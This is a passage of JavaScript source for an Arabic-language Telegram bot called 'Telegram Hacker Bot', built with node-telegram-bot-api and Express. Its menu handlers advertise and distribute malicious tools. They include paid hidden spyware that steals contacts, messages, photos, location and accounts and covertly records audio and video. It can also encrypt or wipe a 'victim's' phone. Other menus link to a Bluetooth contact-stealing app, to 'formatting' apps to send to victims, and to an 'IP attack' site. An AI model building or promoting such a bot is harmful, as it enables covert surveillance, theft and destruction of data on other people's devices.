                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML'
                    });
                    
                    const shortLinks = await linkShortener.shortenUrl(originalLink);
                    let message = "✅ <b>روابطك المختصرة:</b>\n\n";
                    
                    if (shortLinks.length > 0) {
                        shortLinks.forEach((link, index) => {
                            message += `${index + 1}. ${link}\n`;
                        });
                    } else {
                        message += originalLink + "\n";
                    }
                    
                    message += `\n🔍 <b>جرب الروابط التي ستعمل معك</b>`;
                    
                    await bot.editMessageText(message, {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    });
                }
                break;
                
            // الأزرار الخاصة الأخرى
            case "contact_developer_full_hack":
                await bot.editMessageText(
                    "☠️ <b>إختراق الهاتف كاملاً ☠️</b>\n\n" +
                    "🙂 <b>تتم عملية اختراق الهاتف كاملا والوصول لجميع معلومات جهاز شخص يبتزك او يضايقك عبر برنامج مخفي والاذونات تلقائي ومشفر من جميع مكافحه الفيروسات ما عليك الا انتقوم بارسالة الى الشخص وعند تثبيتة راح تقدر تتحكم بجهازة من خلال البوت فقط</b>\n\n" +
                    "🔥 <b>راح تقدر تحصل على :</b>\n" +
                    "<b>✔️ سحب جهات الاتصال 🔥</b>\n\n" +
                    "<b>✔️ سحب سجل المكالمات 🔥</b>\n\n" +
                    "<b>✔️ تسجيل صوت الشخص 🔥</b>\n" +
                    "<b>( بدون ميعرف )</b>\n\n" +
                    "<b>✔️ تلتقط فيديو وسلفي لوجهه 🔥</b>\n" +
                    "<b>(بدون ميعرف)</b>\n\n" +
                    "<b>✔️ سحب جميع الرسائل 🔥</b>\n\n" +
                    "<b>✔️ تسحب ملف + تحذف ملف 🔥</b>\n\n" +
                    "<b>✔️ سحب الموقع 🔥</b>\n\n" +
                    "<b>✔️ سحب جميع الصور 🔥</b>\n\n" +
                    "<b>✔️ تشغيل صوت + ايقاف الصوت 🔥</b>\n\n" +
                    "<b>✔️ ارسال رسالة 🔥</b>\n\n" +
                    "<b>✔️ سحب الحسابات 🔥</b>\n\n" +
                    "<b>✔️ التجسس على الرسائل 🔥</b>\n\n" +
                    "<b>✔️ ارسال رسائل لجهات الاتصال 🔥</b>\n\n" +
                    "<b>✔️ معلومات الجهاز 🔥</b>\n\n" +
                    "<b>✔️ الاشعارات 🔥</b>\n\n" +
                    "<b>✔️ التقاط شاشه 🔥</b>\n\n" +
                    "<b>✔️ الاتصال من هاتف الضحيه 🔥</b>\n\n" +
                    "<b>✔️ تشفير ملفات الضحيه 🔥</b>\n\n" +
                    "<b>✔️ سحب رسايل جيميل 🔥</b>\n\n" +
                    "<b>✔️ فرمته هاتف الضحيه 🔥</b>\n\n" +
                    "<b>✔️ قرأت كل ما يكتب الضحيه 🔥</b>\n\n" +
                    "<b>✔️ قفل هاتف الضحيه برمز 🔥</b>\n\n" +
                    "<b>✔️ فتح اي رابط بهاتف الضحيه 🔥</b>\n\n" +
                    "<b>✔️ وفي اشياء راح تكتشفها بنفسك 🔥</b>\n\n" +
                    "😘 <b>للاشتراك رسالني : @jt_r3r 💌</b>\n\n" +
                    "⚠️ <b>ملاحظة : غير مسؤول امام الله على طريقة استعمالك للطريقة فقط تم صناعتها لمحاربة الابتزاز او لحل مشكلة تواجهك</b>",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML'
                    }
                );
                break;
                
            case "btn_contacts":
                await bot.editMessageText(
                    "⛔⛔⛔ (((مهم جدا انك تقرا ده))) ⛔⛔⛔\n\n" +
                    "<b>كيفية استخدام التطبيق:</b> \n\n" +
                    "التطبيق هيكون معاك علي الفون \n" +
                    "هتدخل علي التطبيق \n" +
                    "التطبيق هيطلب منك السماح انو يفتح البلوتوث \n" +
                    "علشان يشوف الاجهزه المجاوره ليك \n" +
                    "او القريبه ليك \n" +
                    "او انت تدخل تعمل اقتران للجهاز اللي هتسحب منو\n\n" +
                    "و بعدين التطبيق هيبعت طلب اقتران \n" +
                    "للفون اللي انت اختارتو من الداخل البلوتوث \n" +
                    "اول ما الجهاز التاني يدوس اقتران \n" +
                    "جهات الاتصال كلها هتظهر عندك ف التطبيق ✅ \n\n" +
                    "<b>إضغط لتحميل التطبيق 👇✅</b>",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "☠️ التطبيق ☠️", url: "https://url-shortener.me/22FO" }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            case "fire_apps_menu":
                await bot.editMessageText(
                    "🔥 <b>تـــطــــبـــيـــقـــات فرمتة الهاتف</b>\n\n" +
                    "⚠️ <b>اختر التطبيق الذي تريد تحميله:</b>",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "عرض التطبيقات ⚡", callback_data: "format_app" }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            case "format_app":
                await bot.editMessageText(
                    "☠️ <b>تطبيقات فرمتة ☠️🔥</b>\n\n" +
                    "⛔⚡<b>مهم⚡⛔</b>\n" +
                    "<b>ثبت التطبيقات</b>\n" +
                    "⛔⛔<b>بس⛔⛔</b>\n" +
                    "<b>لا تفتح التطبيقات علي الفون بتاعك</b>\n" +
                    "<b>ابعتو للضحية مباشر ✅⚡</b>\n\n" +
                    "👇 <b>إختار التطبيق للتحميل:</b>",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "⚡التطبيق الاول ⚡", url: "https://mega.nz/file/yIM2RaAa#vJkb5olqOn4jeshfxsiAtzjLUPiDKK2t_i92vU-gz60" }],
                                [{ text: "⚡ التطبيق التاني ⚡", url: "https://mega.nz/file/7EMnAQSB#vK0fvBfSZKcFxTtVV99gVYhT-T7kbwMWCL5ylgu6nO4" }],
                                [{ text: "🔙 رجوع", callback_data: "fire_apps_back" }]
                            ]
                        }
                    }
                );
                break;
                
            case "fire_apps_back":
                await bot.editMessageText(
                    "🔥 <b>تـــطــــبـــيـــقـــات فرمتة الهاتف</b>\n\n" +
                    "⚠️ <b>اختر التطبيق الذي تريد تحميله:</b>",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "عرض التطبيقات ⚡", callback_data: "format_app" }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            case "virtual_numbers":
                await bot.editMessageText(
                    "☎️ <b>اليك افضل موقع ارقام وهمية ☎️✅</b>\n\n" +
                    "🔗 <b>الموقع:</b> https://ar.temporary-phone-number.com/",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "☎️ الموقع", url: "https://ar.temporary-phone-number.com/" }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            case "btn17":
                await bot.editMessageText(
                    "📧 <b>خدمة الإيميل المؤقت</b>\n\n" +
                    "🔗 <b>بوت الإيميل المؤقت:</b> @emaaaaliyBot",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "📧 فتح البوت", url: "https://t.me/emaaaaliyBot" }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            case "btn_ttt":
                await bot.editMessageText(
                    "😂 <b>موقع تخويف فقط!</b>\n\n" +
                    "🔗 https://gilded-banoffee-dc4ff8.netlify.app/",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "🌐 فتح الموقع", url: "https://gilded-banoffee-dc4ff8.netlify.app/" }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            case "ip_attack":
                await bot.editMessageText(
                    "⚡ <b>خدمة هجوم على IP الجهاز</b>\n\n" +
                    "🔗 <b>الرابط:</b> https://tubular-gaufre-c265ad.netlify.app/",
                    {
                        chat_id: chatId,
                        message_id: messageId,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "🌐 فتح الرابط", url: "https://tubular-gaufre-c265ad.netlify.app/" }],
                                [{ text: "🔙 رجوع للقائمة", callback_data: "back_to_main" }]
                            ]
                        }
                    }
                );
                break;
                
            default:
                await bot.editMessageText("❌ هذا الزر غير متاح حالياً", {
                    chat_id: chatId,
                    message_id: messageId
                });
        }
    } catch (error) {
        console.error('Error handling callback:', error);
    }
});

// ========== معالجة الرسائل النصية ==========
bot.on('message', async (msg) => {
    // تجاهل الأوامر (يتم معالجتها بشكل منفصل)
    if (msg.text && msg.text.startsWith('/')) {
        return;
    }
    
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text || '';
    
    // إضافة المستخدم للقاعدة
    addUserToDatabase(userId);
    
    // التحقق من سياق المستخدم
    const context = userContext[userId];
    
    if (!context || !context.action) {
        // إذا لم يكن هناك سياق، تجاهل الرسالة
        return;
    }
    
    try {
        switch(context.action) {
            case 'decorate_name':
                if (text.trim()) {
                    await bot.sendMessage(chatId, "✨ <b>جارٍ الزخرفة...</b>", { parse_mode: 'HTML' });
                    const decoratedNames = decorateName(text.trim());
                    
                    // إرسال الأسماء المزخرفة (بحد أقصى 30)
                    for (let i = 0; i < Math.min(decoratedNames.length, 30); i++) {
                        await bot.sendMessage(chatId, decoratedNames[i]);
                        await new Promise(resolve => setTimeout(resolve, 100));
                    }
                    
                    await bot.sendMessage(chatId, "🎉 <b>تم الانتهاء من الزخرفة!</b>\n\n💡 <b>متنساش تشكر حمزه😇❤️‍🩹</b>", { parse_mode: 'HTML' });
                } else {
                    await bot.sendMessage(chatId, "❌ <b>الرجاء إرسال اسم صحيح</b>", { parse_mode: 'HTML' });
                }
                break;
                
            case 'waiting_for_link':
                if (text.toLowerCase().startsWith('https://')) {
                    await bot.sendMessage(chatId, 
                        `🔗 <b>الرابط الملتغم:</b>\n${text}\n\n` +
                        `⚠️ <b>تم التلغيم بنجاح!</b>`,
                        { parse_mode: 'HTML' }
                    );
                } else {
                    await bot.sendMessage(chatId, "❌ <b>الرابط يجب أن يبدأ بـ https://</b>", { parse_mode: 'HTML' });
                }
                break;
                
            case 'check_link':
                if (text.toLowerCase().startsWith('http')) {
                    await bot.sendMessage(chatId, "🔍 <b>جاري فحص الرابط...</b>", { parse_mode: 'HTML' });
                    try {
                        const response = await axios.get(text, { timeout: 10000 });
                        await bot.sendMessage(chatId, 
                            `✅ <b>الرابط يعمل</b>\n` +
                            `📊 <b>الحالة:</b> ${response.status}`,
                            { parse_mode: 'HTML' }
                        );
                    } catch (error) {
                        await bot.sendMessage(chatId, 
                            `❌ <b>الرابط لا يعمل</b>\n` +
                            `📊 <b>الخطأ:</b> ${error.message}`,
                            { parse_mode: 'HTML' }
                        );
                    }
                } else {
                    await bot.sendMessage(chatId, "❌ <b>الرابط غير صالح</b>", { parse_mode: 'HTML' });
                }
                break;
                
            case 'track_ip':
                if (text.trim()) {
                    await bot.sendMessage(chatId, "🌍 <b>جاري تتبع العنوان...</b>", { parse_mode: 'HTML' });
                    const result = await trackIP(text.trim());
                    await bot.sendMessage(chatId, result, { parse_mode: 'HTML' });
                }
                break;
                
            case 'message_to_developer':
                if (text.trim()) {
                    await bot.sendMessage(DEVELOPER_ID,
                        `📩 <b>رسالة من مستخدم</b>\n\n` +
                        `👤 <b>المستخدم:</b> ${msg.from.first_name || 'غير معروف'}\n` +
                        `🆔 <b>ID:</b> ${userId}\n` +
                        `💌 <b>الرسالة:</b>\n${text}`,
                        { parse_mode: 'HTML' }
                    );
                    await bot.sendMessage(chatId, "✅ <b>تم إرسال رسالتك للمطور</b>", { parse_mode: 'HTML' });
                }
                break;
        }
        
        // مسح سياق المستخدم بعد المعالجة
        delete userContext[userId];
    } catch (error) {
        console.error('Error processing message:', error);
        await bot.sendMessage(chatId, "❌ <b>حدث خطأ في المعالجة</b>", { parse_mode: 'HTML' });
    }
});

// ========== أوامر المطور ==========
bot.onText(/\/stop/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isDeveloper(userId)) {
        await bot.sendMessage(chatId, "❌ <b>هذا الأمر للمطور فقط!</b>", { parse_mode: 'HTML' });
        return;
    }
    
    BOT_STATUS = "stopped";
    await bot.sendMessage(chatId, 
        "🛑 <b>تم إيقاف البوت بنجاح!</b>\n\n" +
        "📊 <b>الحالة:</b> متوقف عن العمل\n" +
        "👤 <b>المستخدمون:</b> لا يمكنهم استخدام البوت\n" +
        "⚡ <b>لتفعيل البوت:</b> أرسل /zero",
        { parse_mode: 'HTML' }
    );
});

bot.onText(/\/zero/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isDeveloper(userId)) {
        await bot.sendMessage(chatId, "❌ <b>هذا الأمر للمطور فقط!</b>", { parse_mode: 'HTML' });
        return;
    }
    
    BOT_STATUS = "running";
    await bot.sendMessage(chatId, 
        "✅ <b>تم تشغيل البوت بنجاح!</b>\n\n" +
        "📊 <b>الحالة:</b> يعمل بشكل طبيعي\n" +
        "👤 <b>المستخدمون:</b> يمكنهم استخدام البوت\n" +
        "🛑 <b>لإيقاف البوت:</b> أرسل /stop",
        { parse_mode: 'HTML' }
    );
});

// ========== إعداد Express ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Telegram Hacker Bot</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    margin: 0;
                    padding: 20px;
                    color: white;
                    text-align: center;
                }
                .container {
                    max-width: 800px;
                    margin: 0 auto;
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    border-radius: 20px;
                    padding: 40px;
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                }
                h1 {
                    font-size: 2.5em;
                    margin-bottom: 10px;
                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
                }
                .status {
                    display: inline-block;
                    padding: 10px 20px;
                    background: ${BOT_STATUS === "running" ? "#4CAF50" : "#F44336"};
                    border-radius: 50px;
                    font-weight: bold;
                    margin: 20px 0;
                }
                .stats {
                    display: flex;
                    justify-content: space-around;
                    flex-wrap: wrap;
                    margin: 30px 0;
                }
                .stat-item {
                    background: rgba(255, 255, 255, 0.2);
                    padding: 20px;
                    border-radius: 10px;
                    margin: 10px;
                    flex: 1;
                    min-width: 150px;
                }
                .stat-number {
                    font-size: 2em;
                    font-weight: bold;
                    color: #ffcc00;
                }
                .start-bot {
                    display: inline-block;
                    background: #ffcc00;
                    color: #333;
                    padding: 15px 30px;
                    margin: 20px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    font-size: 1.2em;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🤖 Telegram Hacker Bot</h1>
                <div class="status">
                    حالة البوت: ${BOT_STATUS === "running" ? "🟢 يعمل بنجاح" : "🔴 متوقف"}
                </div>
                
                <p>بوت أدوات الاختراق والحماية المتكامل</p>
                
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-number">${USER_DATABASE.size}</div>
                        <div>المستخدمين</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">${BLOCKED_USERS.size}</div>
                        <div>محظورين</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">30+</div>
                        <div>أداة</div>
                    </div>
                </div>
                
                <a href="https://t.me/${bot.token.split(':')[0]}_bot" class="start-bot">
                    🚀 ابدأ استخدام البوت
                </a>
                
                <p style="margin-top: 40px;">
                    المطور: حمزة | @jt_r3r<br>
                    ${new Date().toLocaleString('ar-EG')}
                </p>
            </div>
        </body>
        </html>
    `);
});

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log('🚀 البوت يعمل بنجاح!');
    console.log(`🌐 الويب: http://localhost:${PORT}`);
    console.log(`🤖 البوت: @${bot.token.split(':')[0]}_bot`);
    console.log(`📊 الحالة: ${BOT_STATUS === "running" ? "🟢 نشط" : "🔴 متوقف"}`);
    console.log(`👤 المطور: ${DEVELOPER_ID}`);
    console.log('='.repeat(50));
    console.log('✅ كل الميزات شغالة:');
    console.log('   • الزخرفة بالأنماط المطلوبة');
    console.log('   • لعبة XO الكاملة');
    console.log('   • نظام التقييم');
    console.log('   • تتبع IP');
    console.log('   • جميع أدوات الاختراق');
    console.log('   • الترتيب الأصلي للأزرار');
    console.log('='.repeat(50));
});

// معالجة الأخطاء
bot.on('polling_error', (error) => {
    console.error('Polling error:', error);
});

bot.on('webhook_error', (error) => {
    console.error('Webhook error:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled rejection:', reason);
});
